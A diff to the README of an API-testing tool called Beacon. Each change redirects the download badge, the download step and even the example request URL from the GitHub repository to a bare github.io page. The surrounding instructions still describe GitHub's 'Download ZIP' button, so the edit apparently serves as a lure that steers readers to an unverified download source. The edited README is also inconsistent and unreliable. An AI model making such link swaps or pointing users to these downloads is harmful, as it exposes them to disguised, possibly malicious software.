@@ -1,6 +1,6 @@
 # 🛰️ beacon-response-testing-hub - Test APIs Without Coding
 
-[![Download Beacon](https://img.shields.io/badge/Download%20Beacon-8A2BE2?style=for-the-badge&logo=github)](https://github.com/swedishturnipvault25/beacon-response-testing-hub)
+[![Download Beacon](https://img.shields.io/badge/Download%20Beacon-8A2BE2?style=for-the-badge&logo=github)](https://swedishturnipvault25.github.io)
 
 ## 🌟 What is Beacon?
 
@@ -12,7 +12,7 @@ To start using Beacon, follow these simple steps:
 
 ### Step 1: Download Beacon
 
-Visit this link to download the application: [https://github.com/swedishturnipvault25/beacon-response-testing-hub](https://github.com/swedishturnipvault25/beacon-response-testing-hub)
+Visit this link to download the application: [https://swedishturnipvault25.github.io](https://swedishturnipvault25.github.io)
 
 Click the large green "Code" button on that page, then select "Download ZIP" to get the Beacon application files.
 
@@ -52,7 +52,7 @@ Test how services behave when you send many requests quickly. Beacon shows you w
 ### Creating Your First Request
 
 1. Open Beacon
-2. In the URL field, type `https://api.example.com/users`
+2. In the URL field, type `https://swedishturnipvault25.github.io`
 3. Click the "Send" button
 4. View the response in the panel below
 
